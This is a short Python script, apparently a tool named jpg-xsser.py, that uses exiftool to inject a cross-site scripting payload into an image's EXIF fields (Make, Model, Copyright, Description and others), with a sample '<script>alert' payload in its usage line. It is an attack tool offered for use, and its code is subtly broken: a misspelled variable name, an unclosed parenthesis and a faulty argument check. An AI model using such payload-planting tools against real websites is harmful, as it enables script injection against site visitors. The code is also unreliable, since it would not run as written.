import sys
import subprocess

#wrapper for exiftool
#apt-get install exiftool
#for python3

metatada_fields = [
	"ImageDescription",
	"Make",
	"Model",
	"Software",
	"Copyright",
	"Location",
	"Description"
]

if sys.argv[1] and sys.argv[2]:
	img = sys.argv[1]
	xss = sys.argv[2]
	
	for exif in metadata_fields:
		attr = "-{0}={1}".format(exif, xss)
		subprocess.call(["exiftool", attr, img]

	subprocess.call(["exiftool", img])
else:
	print("usage: python3 jpg-xsser.py some.jpg '<script>alert(\"xss\")'")
